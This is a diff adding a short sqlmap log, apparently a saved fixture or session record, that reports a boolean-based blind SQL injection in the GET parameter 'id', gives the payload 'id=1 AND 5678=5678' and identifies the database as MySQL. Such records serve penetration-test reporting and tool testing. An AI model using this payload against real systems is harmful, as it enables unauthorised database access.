@@ -1,0 +1,9 @@
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 5678=5678
+---
+[10:23:45] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL
